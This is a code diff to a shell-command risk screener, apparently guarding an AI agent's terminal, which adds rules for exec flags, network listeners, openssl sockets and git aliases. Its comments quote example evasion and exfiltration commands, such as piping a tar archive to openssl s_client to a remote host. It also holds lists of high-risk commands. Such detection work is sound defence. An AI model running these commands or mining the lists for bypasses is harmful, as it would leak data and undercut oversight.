@@ -2692,6 +2692,7 @@ _HIGH_RISK_COMMANDS = frozenset(
         # persistence or tear down services, the twins of crontab/systemctl.
         # Gated wholesale (a read-only `reg query` prompts too): the destructive
         # subcommand lives in the arguments and this mode errs toward prompting.
+        "systemd-run",
         "schtasks",
         "reg",
         "sc",
@@ -2723,6 +2724,9 @@ _HIGH_RISK_RECURSIVE_COMMANDS = frozenset({"chmod", "chown", "chgrp"})
 # (find . -exec rm, echo x | xargs rm, parallel rm, watch rm), so the wrapped
 # command is checked against the high-risk sets too.
 _HIGH_RISK_FORWARDING_COMMANDS = frozenset({"find", "fd", "xargs", "parallel", "watch"})
+# Of those, find/fd only execute a child after an explicit -exec-style flag.
+_EXEC_FLAG_FORWARDING_COMMANDS = frozenset({"find", "fd"})
+_EXEC_FORWARD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir", "--exec", "-x", "-X"})
 # find/fd flags that delete matches outright (a bare `find . -delete`, with no
 # separate command token to catch); an `-exec rm` is caught via forwarding.
 _HIGH_RISK_FIND_FLAGS = frozenset({"-delete"})
@@ -2730,6 +2734,9 @@ _HIGH_RISK_FIND_FLAGS = frozenset({"-delete"})
 # hard-blocked one) rides inside an argument instead of at command position.
 # GNU tar --checkpoint-action=exec=CMD, rsync/scp -e REMOTE_SHELL.
 _HIGH_RISK_ARG_EXEC_FLAGS = frozenset({"--checkpoint-action", "--rsh", "--rsync-path"})
+# ...but only for the utilities that actually run them; otherwise a mere
+# mention (printf '%s' --rsh, a grep for the flag name) would prompt.
+_ARG_EXEC_FLAG_OWNERS = frozenset({"tar", "gtar", "bsdtar", "rsync", "scp", "sftp"})
 # An interpreter run as a network server (python -m http.server, uvicorn app:api)
 # listens on a socket; the sandbox has no network namespace, so the session
 # workdir becomes reachable wherever that port is exposed. Both forms are
@@ -2744,6 +2751,7 @@ _LISTENER_PY_MODULE_RE = re.compile(
     r"\b(?:python|pypy)[0-9.]*\s+(?:-\S+\s+)*-m\s+(?:" + _LISTENER_PY_MODULES + r")\b",
     re.IGNORECASE,
 )
+_LISTENER_BINARIES = frozenset({"uvicorn", "gunicorn", "waitress-serve", "hypercorn", "daphne"})
 _LISTENER_BIN_AT_CMD_RE = re.compile(
     r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
     r"(?:uvicorn|gunicorn|waitress-serve|hypercorn|daphne)\b"
@@ -2800,7 +2808,10 @@ _NETWORK_CLIENT_AT_CMD_RE = re.compile(
 # openssl's s_client/s_server open a TLS socket, the classic no-curl exfil
 # channel (tar czf - . | openssl s_client -connect host:443). Plain openssl
 # (dgst, enc) is local and stays out.
-_OPENSSL_NETWORK_RE = re.compile(r"\bopenssl\s+s_(?:client|server)\b")
+_OPENSSL_NETWORK_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
+    r"(?:\S*/)?openssl\s+s_(?:client|server)\b"
+)
 # An array expansion (${x[*]}, ${x[@]}) builds a command from elements the
 # static scan cannot resolve; fed to a shell -c/eval it runs an unscreened
 # payload (x=(git clean -fd); bash -c "${x[*]}"). Paired with the
@@ -2900,7 +2911,7 @@ _CMD_SHELLS = frozenset({"cmd"})
 _POWERSHELL_INTERPRETERS = frozenset({"powershell", "pwsh"})
 # Versioned interpreter binaries (python3.11, python2.7, pypy3.10) are the same
 # inline-code risk as their unversioned names, so recognise the version suffix.
-_VERSIONED_INTERPRETER_RE = re.compile(r"^(?:python|pypy)\d+(?:\.\d+)*$")
+_VERSIONED_INTERPRETER_RE = re.compile(r"^(?:python|pypy|perl|ruby|php|node)\d+(?:\.\d+)*$")
 # busybox / toybox dispatch to an applet given as the first argument
 # (busybox rm -rf ...), so they are treated like a command wrapper: the applet,
 # not the multicall binary, is the command whose risk is judged.
@@ -3174,7 +3185,9 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
             return True
         # GNU tar runs --checkpoint-action=exec=CMD at each checkpoint, hiding a
         # command (including hard-blocked ones) inside an argument.
-        if any(t.split("=", 1)[0] in _HIGH_RISK_ARG_EXEC_FLAGS for t in tokens):
+        if any(
+            os.path.basename(t.strip(";&|()`{}")).lower() in _ARG_EXEC_FLAG_OWNERS for t in tokens
+        ) and any(t.split("=", 1)[0] in _HIGH_RISK_ARG_EXEC_FLAGS for t in tokens):
             return True
         # An interpreter serving on the network (python -m http.server, uvicorn
         # app:api) exposes the session workdir; the sandbox keeps no network
@@ -3188,6 +3201,9 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
         git_subcommand = ""  # the first positional after `git`
         shell_c_pending = False  # a shell `-c` precedes its inline payload
         wrapper_value_pending = False  # a wrapper option precedes its value
+        exec_flag_pending = False  # inside find/fd, waiting for -exec
+        git_checkout_positionals = 0  # positionals seen after `git checkout`
+        git_config_alias_pending = False  # `git config alias.x` precedes its body
         git_glob_pending = False  # a git global option (-C repo) precedes its value
         chdir_pending = False  # a cd/pushd precedes its target directory
         for _tok_idx, token in enumerate(tokens):
@@ -3207,6 +3223,11 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
                 continue
             if token.startswith("-"):
                 flag = token.split("=", 1)[0]
+                # find/fd: the command after -exec/-ok is the one that runs.
+                if exec_flag_pending and flag in _EXEC_FORWARD_FLAGS:
+                    scan_forward = True
+                    expect_command = True
+                    continue
                 # A wrapper option that takes a SEPARATE value (env -u NAME,
                 # stdbuf -o L, timeout --signal TERM): the next token is that
                 # value, not the wrapped command, so consume it and keep looking.
@@ -3255,7 +3276,9 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
                         if payload and payload.isalpha() and len(payload) <= 4:
                             shell_c_pending = True
                         elif payload:
-                            if _depth < 3 and _terminal_is_high_risk(payload, _depth + 1):
+                            if _depth >= 3:
+                                return True
+                            if _terminal_is_high_risk(payload, _depth + 1):
                                 return True
                         else:
                             shell_c_pending = True
@@ -3288,7 +3311,9 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
                     # git checkout -f / --force, or an explicit `--` path
                     # separator (git checkout -- file), discards tracked edits.
                     if git_subcommand == "checkout" and (
-                        flag in _HIGH_RISK_GIT_CHECKOUT_FLAGS or token == "--"
+                        flag in _HIGH_RISK_GIT_CHECKOUT_FLAGS
+                        or token == "--"
+                        or flag == "--pathspec-from-file"
                     ):
                         return True
                     # git switch discards tracked edits with the same flags.
@@ -3324,9 +3349,13 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
                 # tokens, not just this one; screen the whole remainder so the
                 # nested command's own arguments are seen.
                 payload = " ".join(tokens[_tok_idx:])
-                if _depth < 3 and _terminal_is_high_risk(payload, _depth + 1):
+                if _depth >= 3:
+                    # Too deeply nested to screen: fail closed rather than let
+                    # an unscreened payload through (matches the docstring).
                     return True
-                if _depth < 3 and payload != raw and _terminal_is_high_risk(raw, _depth + 1):
+                if _terminal_is_high_risk(payload, _depth + 1):
+                    return True
+                if payload != raw and _terminal_is_high_risk(raw, _depth + 1):
                     return True
                 expect_command = False
                 continue
@@ -3372,10 +3401,21 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
             if expect_command or prefix_pending or scan_forward:
                 if base in _HIGH_RISK_COMMANDS or base.startswith("mkfs"):
                     return True
+                # A server binary resolved here covers the wrapped and absolute
+                # forms (env uvicorn app:api, timeout 60 gunicorn, /usr/bin/uvicorn).
+                if base in _LISTENER_BINARIES:
+                    return True
                 if base in _HIGH_RISK_RECURSIVE_COMMANDS and recursive:
                     return True
                 if base in _HIGH_RISK_FORWARDING_COMMANDS:
-                    scan_forward = True
+                    # find/fd only run a child at -exec/-execdir/-ok; forwarding
+                    # from the command itself makes every later positional look
+                    # executable (`find . -name rm` would prompt).
+                    if base in _EXEC_FLAG_FORWARDING_COMMANDS:
+                        scan_forward = False
+                        exec_flag_pending = True
+                    else:
+                        scan_forward = True
                 elif base == "git":
                     # Only git needs the forwarding scan to stop: its risk lives
                     # in the SUBCOMMAND (git clean), so following tokens must be
@@ -3401,6 +3441,28 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
             elif current_command == "git" and git_subcommand == "checkout" and base == ".":
                 # `git checkout .` discards every tracked working-tree change.
                 return True
+            elif current_command == "git" and git_subcommand == "checkout":
+                # A SECOND positional means the first was a commit-ish and this
+                # is a pathspec (git checkout HEAD file), which overwrites the
+                # file. A single positional is ambiguous with a branch name and
+                # is deliberately left alone.
+                git_checkout_positionals += 1
+                if git_checkout_positionals >= 2:
+                    return True
+            elif (
+                current_command == "git" and git_subcommand == "config" and git_config_alias_pending
+            ):
+                git_config_alias_pending = False
+                # The stored alias body is code git runs on the next invocation.
+                nested = raw[1:] if raw.startswith("!") else "git " + raw
+                if _depth >= 3 or _terminal_is_high_risk(nested, _depth + 1):
+                    return True
+            elif (
+                current_command == "git"
+                and git_subcommand == "config"
+                and raw.lower().startswith("alias.")
+            ):
+                git_config_alias_pending = True
             elif (
                 current_command == "git"
                 and git_subcommand == "stash"
@@ -3506,6 +3568,18 @@ def _python_is_high_risk(code: str) -> bool:
             for tgt in node.targets:
                 if isinstance(tgt, ast.Name):
                     file_handles.add(tgt.id)
+        elif isinstance(node, (ast.With, ast.AsyncWith)):
+            # `with open(p, "r+") as f:` binds the handle just like an
+            # assignment, and is the more idiomatic form.
+            for item in node.items:
+                ctx = item.context_expr
+                if (
+                    isinstance(ctx, ast.Call)
+                    and isinstance(ctx.func, ast.Name)
+                    and ctx.func.id == "open"
+                    and isinstance(item.optional_vars, ast.Name)
+                ):
+                    file_handles.add(item.optional_vars.id)
     if file_handles:
         for node in ast.walk(tree):
             if (
